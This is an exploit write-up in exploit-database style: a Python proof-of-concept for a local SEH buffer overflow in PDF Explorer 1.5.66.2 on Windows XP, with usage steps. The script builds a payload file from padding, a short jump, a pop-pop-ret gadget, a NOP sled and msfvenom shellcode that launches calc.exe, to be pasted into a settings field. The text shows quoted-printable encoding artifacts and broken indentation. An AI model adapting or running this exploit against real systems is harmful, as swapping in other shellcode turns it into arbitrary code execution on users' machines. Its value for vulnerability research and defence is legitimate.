# Exploit Title: PDF Explorer SEH Local Exploit
# Original Discovery:Gionathan "John" Reale (DoS exploit)
# Exploit Author: Achilles
# Date: 18-12-2018
# Vendor Homepage: http://www.rttsoftware.com/
# Software Link:   https://www.rttsoftware.com/files/PDFExplorerTrialSetup.zip
# Tested Version: 1.5.66.2
# Tested on: Windows XP SP3


# 1.- Run python code : PDF_Explorer.py
# 2.- Open EVIL.txt and copy content to clipboard
# 3.- Open PDF Explorer
# 4.- When inside the program click "Database" > "Custom fields settings...
"
# 5.- Paste the content of EVIL.txt into the Field:'Label'and the calculator will Open
# 7.- Greetings go:XiDreamzzXi,Metatron


#!/usr/bin/python
#!/usr/bin/env python
buffer =3D "\x41" * 292
NSEH =3D "\xeb\x06\x90\x90"       #jmp short 6
SEH  =3D "\x3f\x28\xd1\x72"       #0x72d1283f pop eax # pop esi # ret 0x04 [msacm32.drv]
nops =3D "\x90" * 20

#msfvenom -p windows/exec CMD=3Dcalc.exe -b "\x00\x0a\x0d\x23\x80" -f pytho=
n
schellcode =3D ("\xda\xcb\xbf\xbd\x81\x73\x52\xd9\x74\x24\xf4\x5e\x29"=20
"\xc9\xb1\x31\x31\x7e\x18\x03\x7e\x18\x83\xc6\xb9\x63"
"\x86\xae\x29\xe1\x69\x4f\xa9\x86\xe0\xaa\x98\x86\x97"
"\xbf\x8a\x36\xd3\x92\x26\xbc\xb1\x06\xbd\xb0\x1d\x28"
"\x76\x7e\x78\x07\x87\xd3\xb8\x06\x0b\x2e\xed\xe8\x32"
"\xe1\xe0\xe9\x73\x1c\x08\xbb\x2c\x6a\xbf\x2c\x59\x26"
"\x7c\xc6\x11\xa6\x04\x3b\xe1\xc9\x25\xea\x7a\x90\xe5"
"\x0c\xaf\xa8\xaf\x16\xac\x95\x66\xac\x06\x61\x79\x64"
"\x57\x8a\xd6\x49\x58\x79\x26\x8d\x5e\x62\x5d\xe7\x9d"
"\x1f\x66\x3c\xdc\xfb\xe3\xa7\x46\x8f\x54\x0c\x77\x5c"
"\x02\xc7\x7b\x29\x40\x8f\x9f\xac\x85\xbb\x9b\x25\x28"
"\x6c\x2a\x7d\x0f\xa8\x77\x25\x2e\xe9\xdd\x88\x4f\xe9"
"\xbe\x75\xea\x61\x52\x61\x87\x2b\x38\x74\x15\x56\x0e"
"\x76\x25\x59\x3e\x1f\x14\xd2\xd1\x58\xa9\x31\x96\x97"
"\xe3\x18\xbe\x3f\xaa\xc8\x83\x5d\x4d\x27\xc7\x5b\xce"
"\xc2\xb7\x9f\xce\xa6\xb2\xe4\x48\x5a\xce\x75\x3d\x5c"
"\x7d\x75\x14\x3f\xe0\xe5\xf4\xee\x87\x8d\x9f\xee")

payload =3D buffer + NSEH + SEH + nops + schellcode


try:
f=open("Evil.txt","w")
print "[+] Creating %s bytes evil payload.." %len(payload)
f.write(payload)
f.close()
print "[+] File created!"
except:
print "File cannot be created"